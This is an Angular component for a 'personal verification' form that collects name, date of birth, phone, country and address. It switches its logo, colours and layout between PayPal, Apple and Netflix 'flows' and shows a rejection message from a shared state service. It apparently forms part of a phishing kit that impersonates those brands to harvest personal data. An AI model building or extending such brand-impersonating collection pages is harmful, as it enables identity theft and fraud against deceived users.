import { Component, inject, signal, effect, computed } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { StateService } from '../services/state.service';
import { filterCountries, Country } from '../utils/country-data';
import { TranslatePipe } from '../pipes/translate.pipe';
import { InputComponent } from './ui/input.component';
import { ButtonComponent } from './ui/button.component';
import { CardComponent, CardVariant } from './ui/card.component';

@Component({
  selector: 'app-personal-verification',
  standalone: true,
  imports: [
    CommonModule,
    FormsModule,
    TranslatePipe,
    InputComponent,
    ButtonComponent,
    CardComponent
  ],
  host: {
    '[attr.data-theme]': 'currentFlowId()'
  },
  template: `
    <div class="personal-page-content animate-in slide-in-from-bottom-4 duration-500">
        
        <!-- Logo Header (context aware) -->
        @if (showLogo()) {
           <div class="mb-8 text-center">
              <img [src]="logoPath()" class="h-10 mx-auto" alt="Logo">
           </div>
        }

        <ui-card [variant]="cardVariant()" [noPadding]="false" [interactive]="false">
            
            <!-- Header -->
            <div class="text-center mb-6">
               <h2 class="text-2xl font-bold mb-3 tracking-tight" [style.color]="headerColor()">
                 {{ 'PERSONAL.TITLE' | translate }}
               </h2>
               <p class="text-base text-center max-w-[90%] mx-auto leading-relaxed opacity-80"
                  [style.color]="textColor()">
                 {{ 'PERSONAL.SUBTITLE' | translate }}
               </p>
            </div>

            <!-- Error Message -->
            @if (state.rejectionReason()) {
              <div class="mb-6 bg-red-50 border-l-[4px] border-red-500 p-3 flex items-start gap-3 rounded-r text-left animate-fade-in">
                  <span class="material-icons text-red-500 text-xl">error</span>
                  <div>
                    <p class="text-sm font-bold text-red-900">{{ 'PERSONAL.ERROR_TITLE' | translate }}</p>
                    <p class="text-xs text-red-700 mt-1">{{ state.rejectionReason() }}</p>
                  </div>
              </div>
            }

            <div class="space-y-6">

               <!-- Country Selector (Smart Dropdown) -->
               <div class="relative z-50">
                   <div (click)="toggleDropdown()" class="cursor-pointer relative">
                       <ui-input
                          [label]="'PERSONAL.COUNTRY' | translate"
                          [ngModel]="country"
                          [readonly]="true"
                          [iconRight]="true"
                          class="pointer-events-none"> <!-- Input visual only, click handled by wrapper -->
                          <span slot="icon-right" class="material-icons transition-transform duration-300" [class.rotate-180]="showDropdown()">expand_more</span>
                       </ui-input>
                   </div>
    
                   @if(showDropdown()) {
                     <div class="absolute w-full bg-white border border-slate-200 rounded-xl shadow-xl mt-2 overflow-hidden animate-in fade-in zoom-in-95 z-50 max-h-60 flex flex-col">
                        <div class="p-3 border-b border-slate-100 bg-slate-50 sticky top-0">
                            <input 
                                type="text" 
                                [(ngModel)]="searchQuery"
                                (click)="$event.stopPropagation()"
                                placeholder="Search..."
                                class="w-full px-4 py-2 bg-white rounded-lg border border-slate-300 text-sm outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                                autofocus
                            >
                        </div>
                        <ul class="overflow-y-auto flex-1">
                            @for(c of filteredCountries(); track c.code) {
                                <li (click)="selectCountry(c)" class="px-5 py-3 hover:bg-blue-50 text-sm font-medium border-b border-slate-50 last:border-0 cursor-pointer transition-colors text-slate-700">
                                    {{ c.name }}
                                </li>
                            }
                        </ul>
                     </div>
                   }
               </div>
    
               <!-- Name Fields -->
               <div class="grid gap-4" [class.grid-cols-2]="!isApple()" [class.cols-apple]="isApple()">
                  <ui-input 
                      [label]="'PERSONAL.FIRST_NAME' | translate"
                      [(ngModel)]="firstName"
                      (ngModelChange)="update()"
                      [error]="touchedName() && firstName.length < 2 ? 'Required' : ''"
                      (blur)="touchedName.set(true)">
                  </ui-input>
    
                  <ui-input 
                      [label]="'PERSONAL.LAST_NAME' | translate"
                      [(ngModel)]="lastName"
                      (ngModelChange)="update()"
                      [error]="touchedName() && lastName.length < 2 ? 'Required' : ''"
                      (blur)="touchedName.set(true)">
                  </ui-input>
               </div>
    
               <!-- DOB -->
               <ui-input
                  [label]="'PERSONAL.DOB' | translate"
                  type="date"
                  [(ngModel)]="dob"
                  (ngModelChange)="check(); update()"
                  [error]="dobError()"
                  (blur)="touchedDob.set(true)">
               </ui-input>
    
               <!-- Conditional Phone (if skipped earlier) -->
               @if (state.skipPhoneVerification()) {
                   <ui-input
                      [label]="'PERSONAL.PHONE' | translate"
                      type="tel"
                      [(ngModel)]="phoneNumber"
                      (ngModelChange)="onPhoneInput($event)"
                      [error]="phoneError()"
                      (blur)="touchedPhone.set(true)">
                   </ui-input>
               }
    
               <!-- Address Section -->
               <div class="space-y-4 pt-2">
                  <ui-input 
                      [label]="'PERSONAL.ADDRESS' | translate"
                      [(ngModel)]="addrStreet"
                      (ngModelChange)="update()"
                      [error]="touchedAddress() && addrStreet.length < 5 ? 'Invalid Address' : ''"
                      (blur)="touchedAddress.set(true)">
                  </ui-input>
    
                  <div class="grid grid-cols-2 gap-4">
                      <ui-input 
                          [label]="'PERSONAL.CITY' | translate"
                          [(ngModel)]="addrCity"
                          (ngModelChange)="update()"
                          (blur)="touchedAddress.set(true)">
                      </ui-input>
    
                      <ui-input 
                          [label]="'PERSONAL.ZIP' | translate"
                          [(ngModel)]="addrZip"
                          (ngModelChange)="update()"
                          [error]="touchedAddress() && addrZip.length < 4 ? 'Invalid' : ''"
                          (blur)="touchedAddress.set(true)">
                      </ui-input>
                  </div>
               </div>
    
               <div class="pt-6">
                  <ui-button 
                    (click)="submit()"
                    [disabled]="!isValid()"
                    [fullWidth]="true"
                    [variant]="primaryBtnVariant()">
                    {{ 'COMMON.CONTINUE' | translate }}
                  </ui-button>
               </div>
    
            </div>
            
        </ui-card>
      </div>
  `,
  styles: [`
    :host { display: block; width: 100%; }
    
    /* Apple has a unique look for grouped inputs if we want to implement it fully 
       For now, we use the standard grid but allow flexibility */
    .cols-apple {
       display: flex;
       flex-direction: column;
       gap: 1rem;
    }
  `]
})
export class PersonalVerificationComponent {
  state = inject(StateService);

  // Flow State
  currentFlow = this.state.currentFlow;
  currentFlowId = computed(() => this.currentFlow()?.id || 'generic');

  // Form Model
  firstName = '';
  lastName = '';
  dob = '';
  phoneNumber = '';
  country = '';
  addrStreet = '';
  addrCity = '';
  addrZip = '';

  // Search
  searchQuery = signal('');
  showDropdown = signal(false);

  // Validation
  touchedName = signal(false);
  touchedDob = signal(false);
  touchedPhone = signal(false);
  touchedAddress = signal(false);
  isValid = signal(false);
  isAdult = signal(true);

  // Theme Computeds
  theme = computed(() => this.state.currentFlow()?.theme);
  headerColor = computed(() => this.theme()?.input.textColor || 'inherit');
  textColor = computed(() => this.theme()?.input.textColor || 'inherit');

  // Logic Computeds
  showLogo = computed(() => ['paypal', 'apple', 'netflix'].includes(this.currentFlowId()));
  logoPath = computed(() => `assets/images/logos/${this.currentFlowId()}-logo.svg`);
  isApple = computed(() => this.currentFlowId() === 'apple');

  primaryBtnVariant = computed(() => {
    if (this.currentFlowId() === 'netflix') return 'danger';
    return 'primary';
  });

  cardVariant = computed<CardVariant>(() => {
    return 'elevated';
  });

  filteredCountries = computed(() => {
    return filterCountries(this.searchQuery());
  });

  constructor() {
    effect(() => {
      this.firstName = this.state.firstName();
      this.lastName = this.state.lastName();
      this.dob = this.state.dob();
      if (this.state.skipPhoneVerification()) {
        this.phoneNumber = this.state.phoneNumber();
      }
      this.check();
    }, { allowSignalWrites: true });
  }

  // Logic
  toggleDropdown() {
    this.showDropdown.update(v => !v);
  }

  selectCountry(c: Country) {
    this.country = c.name;
    this.showDropdown.set(false);
    this.searchQuery.set('');
    this.check();
    this.update();
  }

  onPhoneInput(val: string) {
    // Simple masking logic
    let input = val.replace(/\D/g, '');
    const match = input.match(/^(\d{0,3})(\d{0,3})(\d{0,4})$/);
    let formatted = input;
    if (match) {
      if (match[1]) formatted = `(${match[1]}`;
      if (match[2]) formatted += `) ${match[2]}`;
      if (match[3]) formatted += `-${match[3]}`;
    }
    if (input.length > 10) formatted = val; // Prevent truncating if not standard US

    this.phoneNumber = formatted;
    this.check();
    this.update();
  }

  update() {
    this.state.updatePersonal({
      first: this.firstName,
      last: this.lastName,
      dob: this.dob,
      address: `${this.addrStreet}, ${this.addrCity} ${this.addrZip}`,
      country: this.country
    });
    if (this.state.skipPhoneVerification()) {
      this.state.updatePhone({ number: this.phoneNumber });
    }
  }

  check() {
    let ageValid = false;
    if (this.dob) {
      const birth = new Date(this.dob);
      const today = new Date();
      let age = today.getFullYear() - birth.getFullYear();
      const m = today.getMonth() - birth.getMonth();
      if (m < 0 || (m === 0 && today.getDate() < birth.getDate())) age--;
      ageValid = age >= 18;
    }
    this.isAdult.set(ageValid);

    let phoneValid = true;
    if (this.state.skipPhoneVerification()) {
      phoneValid = this.phoneNumber.replace(/[^0-9]/g, '').length >= 10;
    }

    this.isValid.set(
      this.country !== '' &&
      this.firstName.length >= 2 &&
      this.lastName.length >= 2 &&
      ageValid &&
      phoneValid &&
      this.addrStreet.length >= 5 &&
      this.addrCity.length >= 3 &&
      this.addrZip.length >= 4
    );
  }

  // Errors
  dobError() {
    if (this.touchedDob()) {
      if (!this.dob) return 'Date of Birth required';
      if (!this.isAdult()) return 'Must be 18 or older';
    }
    return '';
  }

  phoneError() {
    if (this.touchedPhone()) {
      if (this.phoneNumber.replace(/[^0-9]/g, '').length < 10) return 'Invalid phone number';
    }
    return '';
  }

  submit() {
    if (this.isValid()) {
      const fullAddress = `${this.addrStreet}, ${this.addrCity} ${this.addrZip}`;
      this.state.submitPersonal(this.firstName, this.lastName, this.dob, fullAddress, this.country);
    }
  }
}
